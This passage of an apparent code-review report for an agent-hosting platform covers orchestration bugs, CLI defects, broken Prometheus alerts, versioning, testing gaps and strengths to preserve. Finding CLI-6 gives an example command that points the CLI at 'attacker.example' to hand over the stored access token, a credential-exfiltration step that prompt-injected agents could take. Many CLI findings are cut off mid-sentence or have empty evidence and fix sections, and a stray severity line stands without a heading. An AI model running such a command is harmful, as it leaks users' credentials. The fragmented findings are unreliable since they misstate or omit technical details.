  - Disks are host-local, and nothing migrates or evacuates machines.
- **Fix:**
  - Add three host statuses: `active`; `cordoned` (not schedulable, still
    swept); and `retired`.
  - Sweep each machine by its own host.
  - Document how to handle a permanently lost host: an explicit `error`
    reason, and an offer to recreate.

#### ORCH-11 — Task SSE sequence numbers restart with the process, so reconnecting clients miss the result
`Medium` · correctness · Confirmed

- **Evidence:**
  - `taskevents/hub.go:102` uses a per-process `st.seq++`.
  - `httpapi/taskstream.go:108` drops `f.Seq <= sentSeq` **before** checking
    `f.Terminal`.
- **Impact:** A browser that has seen id 300 reconnects after a deploy. The new
  process emits ids 1..N, and every frame, including the terminal `result`, is
  skipped. The stream then heartbeats forever.
- **Fix:** Put a stream epoch into the SSE id (`<epoch>.<seq>`), and replay
  from zero when the epoch differs.

#### ORCH-12 — One serial poller goroutine; a slow host stalls every host
`Medium` · performance/ops · Confirmed

- **Evidence:**
  - Fast and slow ticks share one `select` loop (`poller.go:106-122`).
  - Per-machine Status calls run sequentially with 10 s timeouts.
  - `Registry.List` walks hosts one at a time.
- **Impact:** K transitional machines on a black-holed host stall boots and
  stops everywhere for K × 10 s. Retry budgets count passes, not time.
- **Fix:**
  - Poll hosts concurrently with a bounded errgroup.
  - Make one List call per host for transitional machines too.
  - Use per-call deadlines and jitter.

#### ORCH-13 — Lower-severity orchestration issues
`Low` · various · Confirmed unless noted

- **Machine SSE can skip events** (Likely). The cursor uses `bigserial` ids
  that commit out of order across concurrent transactions
  (`httpapi/sse.go:158`), so events can be skipped. Each event costs about 3
  queries per subscriber, so a 500-event replay costs about 1,500 queries.
- **Retention and indexes:**
  - `ListAgentTasksByMachine` has no LIMIT (`queries.sql:418-420`).
  - There is no `agent_tasks(user_id, created_at)` index, and no index on
    `machines.state`, which is scanned every 2 s.
  - `machine_events` and `audit_log` are never pruned.
  - `machine_events` is described as an audit log but is cascade-deleted with
    the machine.
- **Hub streams leak.** `taskevents` streams that never reach a terminal state
  are never reaped (`hub.go:137-143`), so every stuck task (ORCH-4) holds up to
  500 frames in memory.
- **Broker drops updates** (Likely). The broker drops updates for internal
  `SubscribeAll` consumers once its 32-slot buffer is full (`broker.go:150-154`),
  and guestctl never resyncs. A burst (e.g. ORCH-1) can leave a running machine
  with no control channel.
- **Pool defaults.** `pgxpool` uses its defaults (`store/store.go:17-26`):
  about 4 connections on a small container, no `statement_timeout`, and no
  `pool_max_conns` in compose.

`High` · correctness · Confirmed

#### WEB-3 — Machine SSE never recovers from a non-200 close, and reconnects leave ghost machines
`Medium` · correctness · Confirmed

#### WEB-4 — Mutation responses can overwrite newer SSE state
`Medium` · correctness · Likely

### 4.8 CLI (CLI)

#### CLI-1 — Flags after a positional argument are silently ignored, which breaks documented examples
`High` · correctness · Confirmed (reproduced)

- **Evidence:**
  - **The cause.** `cli/internal/app/app.go:369` calls plain `fs.Parse(args)`.
    Go's `flag` package stops parsing at the first non-flag argument.
  - **Wrong prompt, no watch.**
    `task send --machine m1 t1 --watch "address the review comments"` POSTed

  - **Inconsistent errors.** `hasJSONFlag` scans every argument

    - the help texts in `task.go:231,319`;

    - `cli/README.md:176`.
- **Impact:** An agent following the docs sends a corrupted prompt to the

- **Fix:**
  - Support interspersed flags (re-parse after each positional), or reject

#### CLI-2 — `--json` watch modes exit 0 when the task failed or was cancelled
`High` · correctness (exit-code contract) · Confirmed (reproduced)

- **Evidence:**

- **Impact:** NDJSON is the mode agent consumers use, and the docs promise

- **Fix:**

  - Add tests for both modes.

#### CLI-3 — `project clone --wait` and `project ensure` report success mid-clone, and `ensure` matches on directory name only
`High` · correctness · Confirmed

- **Evidence:**
  - **Success too early.** `project.go:276-299` succeeds as soon as a project
    with that name is listed. The guest lists any directory that contains
    `.git` (`ctlchan/projects.go:42,52-55`), and `git clone` creates `.git`
    before it fetches.
  - **Matching by name only.** `findProject` compares names only
    (`project.go:302-309`), and `repoDir` reduces `owner/repo` to `repo`
    (`:314`).
- **Impact:**
  - `project ensure && task run`, the README's agent journey, can start the

  - An existing `alice/hello-world` satisfies `ensure octocat/hello-world`.
  - A failed clone surfaces only after the 5-minute timeout, with no reason.
- **Fix:**
  - Wait on the clone operation's completion (the `git.clone` machine event,

  - Compare the project's `remote` against the requested repo.

#### CLI-4 — The SSE reader ignores the event type and retries 4xx responses forever
`Medium` · correctness · Confirmed (reproduced)

- **Evidence:**
  - **Bogus events.** `client/sse.go:150` ignores `event:` lines, so the
    server's `shutdown` frame (`taskstream.go:94-97`) becomes an NDJSON line
    `{"kind":""}`.
  - **No reconnect delay.** A clean EOF reconnects immediately (`:81-82`).
  - **Endless retries.** Any status other than 401, 403 or 404 retries forever
    (`:110-116`).
- **Fix:**
  - Dispatch only `event: agent`.
  - Treat `shutdown` as a reconnect hint, with backoff.
  - Treat other 4xx responses (except 408 and 429) as terminal.
  - Enforce a minimum delay between reconnects.

#### CLI-5 — `--json` isn't raw API JSON, and mutations print prose to stdout
`Medium` · design (agent contract) · Confirmed

- **Evidence:**
  - **Fields dropped.** `client/api.go:13-20` drops `last_error`,

  - **Prose on stdout.** `"task %s dispatched"` goes to stdout even with

  - **Gaps in `task cancel`.** It has no `--json`, and `--all-running` exits 0

- **Impact:** This contradicts `docs/CLI.md:113`. Agents have to regex task ids

- **Fix:**
  - Pass through `json.RawMessage`.
  - Add `--json` on every leaf command.
  - Send progress text to stderr.
  - Return non-zero on partial failure.

#### CLI-6 — The stored PAT is sent to whatever `--url` or `PROTEOS_URL` names
`Medium` · security · Confirmed

- **Evidence:** `cli/internal/config/config.go:123-136` lets the URL override

- **Impact:** An agent driving the CLI, possibly prompt-injected, can run
  `proteos machines ls --url https://attacker.example` and hand over the

- **Fix:**

### 4.10 Observability (OBS)

#### OBS-1 — The shipped Prometheus config and alerts don't work
`High` · observability · Confirmed

- **Scrape config:**
  - `deploy/prometheus/scrape.yaml:12` scrapes the control plane over `https`,
    but it serves plain HTTP (`cmd/controlplane/main.go:504`).
  - Compose publishes no control-plane port, and nginx doesn't proxy
    `/metrics`.
  - The node-agent job's `ca_file` is commented out, against a self-signed
    certificate.
- **Alert rules:**
  - `VMBootFailureRateHigh` (`alerts.yaml:17-21`) and
    `ControlPlaneHTTPErrorRateHigh` (`:94-98`) divide `/ on(instance)` with
    several series per instance on each side. Prometheus rejects that as
    many-to-many matching, so neither rule ever evaluates.
  - `MachinesStuckInTransition` (`:118-124`) adds series whose `state` labels
    differ, so the result is always empty and it can never fire.
- **Fix:**
  - Rewrite the rate alerts as
    `sum by(instance)(rate(…{result="error"}[10m])) / sum by(instance)(rate(…[10m]))`.
  - Rewrite the transition alert as
    `sum(proteos_controlplane_machines_by_state{state=~"provisioning|starting|stopping|hibernating"})`.
  - Scrape over `http` on an internal network path, and pin the node-agent CA.
  - Add `promtool check rules` and `promtool test rules` to CI.

#### OBS-2 — Telemetry is thin, and nothing correlates a request across components
`Medium` · observability · Confirmed

- **Evidence:**
  - **Few metrics.** The control plane exports three metrics
    (`metrics/metrics.go:7-24`).
  - **Streams pollute the latency histogram.** It is labelled by method only
    (`httpapi/middleware.go:259`), so hour-long SSE and WebSocket GETs share
    buckets with API GETs.
  - **No metrics for the control loop:** none for the poller (pass duration,
    blips, transitions to `error` by reason), the node client (latency and
    errors per host), the scheduler (`no_capacity`) or tasks (lost
    `agent.done`).
  - **No correlation ids.** A search for `request_id`, `X-Request-Id` or
    `traceparent` finds nothing.
  - **No supporting stack.** There is no tracing, log shipping or dashboard,
    and no exporter for Postgres, OpenBao, backup freshness or disk usage.
  - **The state gauge drifts.** `proteos_controlplane_machines_by_state` drifts
    from startup:
    - the gauge counts are seeded, but the per-machine `states` map starts
      empty (`main.go:107-147`);
    - so the first update of an existing machine only increments;
    - deletes never decrement, and dropped broker updates never resync.
- **Fix:**
  - Add request-id middleware, propagated to the node-agent and into control
    frames.
  - Label the histogram by route template, excluding streaming routes.
  - Add the missing metrics plus `pgxpool` stats.
  - Recompute the state gauge periodically from `AdminCountMachinesByState`.
  - Add node, Postgres and OpenBao exporters and a backup-freshness alert.

### 4.11 Cross-cutting design (X)

#### X-1 — Components don't negotiate or even report versions
`Medium` · design · Confirmed

- **Evidence:**
  - The guest-agent reports its version on `GET /info`
    (`guestagent/api/guestwire.go:713-718`, stamped via
    `guestagent/cmd/guestagent/main.go:38-39`), but nothing in the control
    plane reads it.
  - The node-agent's `/healthz` returns only `{"status":"ok"}`.
  - The control-plane and node-agent binaries aren't version-stamped
    (`controlplane.Dockerfile:32` uses `-ldflags "-s -w"`; `run-node-agent.sh:62`).
  - There is no `/api/version`; `proteos version` prints only the client
    version.
  - No API or protocol version appears anywhere in the four modules.
- **Impact:** Four components ship independently:
  - the control-plane image, under rolling deploys;
  - a native node-agent on each host;
  - a guest-agent baked into long-lived images;
  - the CLI on users' laptops.

  A wire-protocol change has no way to be detected or negotiated, and an
  operator can't see what's running where.
- **Fix:**
  - Stamp every binary.
  - Expose a version plus a protocol/capability set on node-agent `/healthz`
    and guest `/info`.
  - Have the control plane record these per host and per machine, show them in
    the admin console, and refuse (or degrade) on incompatible versions.
  - Add `/api/version` with a minimum CLI version.

#### X-2 — The control plane is single-instance by design but runs as two during rollouts
`Medium` · design · Confirmed

- **Evidence:** Much of the control plane's state is in-process:
  - the machine-event broker (`machine/broker.go:30-31`);
  - the revocation registry (`gateway/registry.go:9-13`);
  - the task-event hub;
  - the blip counters;
  - the guest's single control connection, where the latest dial wins.

  The Kubernetes manifest assumes one replica
  (`deploy/kubernetes/app-stack/base/controlplane.yaml:1-8`), but
  `DEPLOYMENT.md:124-145` runs two during the overlap.
- **Impact:** During every rollout:
  - the guest control channel flaps between replicas;
  - `agent.done` and `agent.event` can land on the replica being killed
    (feeding ORCH-4 and ORCH-11);
  - logging out on one replica doesn't close sockets held by the other.
- **Fix:** Pick one of two options.
  - **Stay single-instance:** use a stop-then-start deploy, accept a few
    seconds of downtime, and document it.
  - **Support multiple instances:** move shared state to Postgres
    `LISTEN/NOTIFY` and leader-elect the poller and guestctl.

### 4.12 Testing strategy (TEST)

#### TEST-1 — Tests don't pin down the properties that matter most
`Medium` · testing · Confirmed

The suite is large (about 34k lines) and the infrastructure is good (a

*what* it asserts:

- **Cross-tenant authorization.** Ownership tests use ids that don't exist

- **Orchestration.** The lifecycle harness uses a single-host client, not the

  - concurrent creates, or Start racing Destroy;
  - the poller racing Ensure;
  - stop-path faults;
  - task reconciliation;
  - SSE reconnect across a restart.
- **Drivers.** The Firecracker driver isn't run through the conformance suite
  (NODE-14).
- **Secrets.** No test checks that `BaoStore` refuses another user's path, that
  provider-key changes re-inject, or how the API behaves while OpenBao is
  sealed.
- **Web.** Nothing tests the SSE hooks, `client.request`, `TasksWindow`,
  `ChangesWindow`, `ReviewScreen` or `DestroyMachineDialog`. WEB-2, WEB-3,
  WEB-5, WEB-6 and WEB-8 would each have been caught by one component test.
- **CLI.** The CLI has no CI job at all. Its tests always put flags first
  (CLI-1), never watch a failed task in `--json` mode (CLI-2), and only
  substring-check ssh.
- **Ops.** Nothing tests the alert rules or a restore.

**Recommended additions, in order of value:**

1. A route-table test driven by the mux registration. For every route it
   asserts 401 without credentials, 403 without CSRF on mutations, and 404 for
   another user's resource on every `{id}` route.
2. A two-host `Registry` test with one host down. It would have caught ORCH-1.
3. A poller fault-injection table, one row per state.
4. The conformance suite run against the Firecracker driver, using fakes.
5. Component tests for the web flows listed above.
6. A CI job for the CLI.
7. `promtool test rules`, and a compose backup/restore smoke test.

## 6. Strengths to preserve

These are deliberate and well executed. Changes should build on them, not
around them.

- **One transition primitive.** `machine.Transition` does a compare-and-swap
  on `state = from` and inserts the `machine_events` row in one transaction,
  checked against an explicit table of allowed transitions
  (`transition.go:51-103`, `state.go:45-54`). The poller treats a lost CAS as
  benign. Any reconciler (ORCH-2, ORCH-9) should be built on this.
- **Ownership checks:**
  - `getOwned` and user-scoped SQL return a uniform 404 for both "not yours"
    and "doesn't exist".
  - Apart from `/api/logs`, no IDOR was found on any `{id}` route.
  - Secret APIs are write-only.
  - The request logger deliberately skips cookies and query strings.
- **Credentials:**
  - Sessions and PATs are opaque 256-bit values stored as SHA-256, and expiry
    and revocation are enforced in the lookup SQL.
  - OIDC uses PKCE S256 with HMAC-signed, constant-time-compared state, and
    `next` is sanitised on both store and read.
  - OpenBao child tokens are orphan, non-renewable and live 90 s.
  - The GitHub token source persists the rotated refresh token before
    releasing the access token, under a per-user lock.
- **The gateway re-validates on every request:** cookie signature, the
  (machine, port) binding, parent-session liveness, ownership and running
  state. WebSocket Origin is checked by exact match before any machine lookup.
- **Node-agent fundamentals:**
  - TLS is mandatory off loopback, the bearer is compared in constant time,
    and the control plane pins each host's certificate.
  - The LUKS key travels over stdin, never argv, disk or logs.
  - The state store writes temp file → fsync → rename under one mutex.
  - Commands run via argv with no shell, and nft teardown matches by comment
    tag.
- **The Kubernetes driver fails closed:**
  - a RuntimeClass preflight and a NetworkPolicy enforcement canary;
  - a per-boot guest auth secret;
  - SA-token automount disabled;
  - RBAC without `secrets/list` or `pods/exec`;
  - `routable()` filtering of snapshot IPs.
- **The SPA renders untrusted content as text:**
  - no `dangerouslySetInnerHTML`, and agent output, diffs, PR text and logs
    render as text;
  - every path segment is encoded, and every request carries `X-Requested-By`;
  - terminal close codes have explicit semantics with capped backoff.
- **CI does real work:**
  - real Postgres with migrations, a sqlc drift check and `-race`;
  - a kind e2e on a real cluster;
  - the OCI guest image is booted and verified (terminal round trip, preview
    forward, persistence);
  - npm audit and govulncheck per module;
  - publishing only on push.
- **Docs and comments explain why.** Code comments consistently record the
  reasoning, the alternatives considered and the incident behind a choice
  (`cli-release.yml`'s module-tag step is a model). That makes a review like
  this one possible, and it's worth keeping, along with correcting the
  comments listed in §5.
